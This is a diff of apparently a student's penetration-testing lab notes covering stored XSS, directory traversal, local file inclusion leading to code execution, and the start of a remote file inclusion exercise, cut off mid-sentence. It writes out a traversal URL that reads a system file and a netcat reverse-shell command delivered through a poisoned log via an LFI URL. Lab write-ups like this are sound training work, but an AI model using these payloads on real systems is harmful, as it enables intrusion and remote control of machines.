@@ -35,7 +35,7 @@ _(To be performed on your own Kali and Windows 10 lab client machines - Reportin
 3.  Does this exploit attack the server or clients of the site?
 As this is a stored XSS the server is on the recieving end. That being said, any user who visits the page is suseptable to attack.
 
-# 9.7.2. Practice - Directory Traversal Vulnerabilities
+# 9.7.2 Directory Traversal Vulnerabilities
 
 ## Practice - Directory Traversal Vulnerabilities
 
@@ -49,7 +49,7 @@ This exploit only requires us to visit the following url:
 From there we can edit the field after `menu.php?file=` to any file we wish to read, for example:
 `http://192.168.231.10/menu.php?file=c:\windows\system32\drivers\etc\hosts`
 
-# 9.8.5  Practice - LFI Code Execution
+# 9.8.5 LFI Code Execution
 
 #### Exercises
 
@@ -67,5 +67,16 @@ We can simply alter our URL to execute the following command:
 `nc -e cmd.exe 192.168.119.231 9001`
 the full URL would resemble the following:
 `http://192.168.231.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=nc%20-e%20cmd.exe%20192.168.119.231%209001`
+
+
+# 9.8.7 Remote File Inclusion (RFI)
+
+## Practice - Remote File Inclusion (RFI)
+
+_(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_
+
+1.  Exploit the RFI vulnerability in the web application and get a shell.
+2.  Using /menu2.php?file=current_menu as a starting point, use RFI to get a shell.
+3.  Use one of the webshells i
 
 
